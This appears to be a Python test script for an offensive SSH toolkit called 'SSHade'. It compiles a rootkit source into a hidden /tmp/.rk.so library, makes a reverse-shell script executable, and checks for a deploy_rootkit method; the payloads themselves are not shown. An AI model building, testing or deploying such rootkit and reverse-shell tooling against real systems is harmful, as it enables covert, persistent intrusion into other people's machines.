#!/usr/bin/env python3
"""
Test script for the C-based rootkit implementation
"""

import os
import sys
import subprocess

def test_rootkit_compilation():
    """Test that the rootkit compiles correctly"""
    print("Testing rootkit compilation...")
    
    # Compile the rootkit
    result = os.system("gcc -fPIC -shared -o /tmp/.rk.so payloads/rootkit.c -ldl 2>/dev/null")
    
    if result == 0:
        print("✓ Rootkit compiled successfully")
        # Check if the file exists
        if os.path.exists("/tmp/.rk.so"):
            print("✓ Rootkit binary exists")
            return True
        else:
            print("✗ Rootkit binary not found")
            return False
    else:
        print("✗ Rootkit compilation failed")
        return False

def test_reverse_shell_script():
    """Test that the reverse shell script exists and is executable"""
    print("Testing reverse shell script...")
    
    if os.path.exists("payloads/reverse_shell.sh"):
        print("✓ Reverse shell script exists")
        # Check if it's executable
        if os.access("payloads/reverse_shell.sh", os.X_OK):
            print("✓ Reverse shell script is executable")
            return True
        else:
            print("✗ Reverse shell script is not executable")
            # Make it executable
            os.system("chmod +x payloads/reverse_shell.sh")
            return True
    else:
        print("✗ Reverse shell script not found")
        return False

def test_sshade_integration():
    """Test that SSHade integration is correct"""
    print("Testing SSHade integration...")
    
    # Check if the deploy_rootkit method exists in sshade.py
    with open("sshade.py", "r") as f:
        content = f.read()
        
    if "def deploy_rootkit(self)" in content:
        print("✓ deploy_rootkit method exists in SSHade")
        return True
    else:
        print("✗ deploy_rootkit method not found in SSHade")
        return False

def main():
    """Run all tests"""
    print("Running rootkit tests...\n")
    
    tests = [
        test_rootkit_compilation,
        test_reverse_shell_script,
        test_sshade_integration
    ]
    
    passed = 0
    total = len(tests)
    
    for test in tests:
        if test():
            passed += 1
        print()  # Add a blank line between tests
    
    print(f"Test Results: {passed}/{total} tests passed")
    
    if passed == total:
        print("All tests passed! The C-based rootkit implementation is ready.")
        return 0
    else:
        print("Some tests failed. Please check the implementation.")
        return 1

if __name__ == "__main__":
    sys.exit(main())
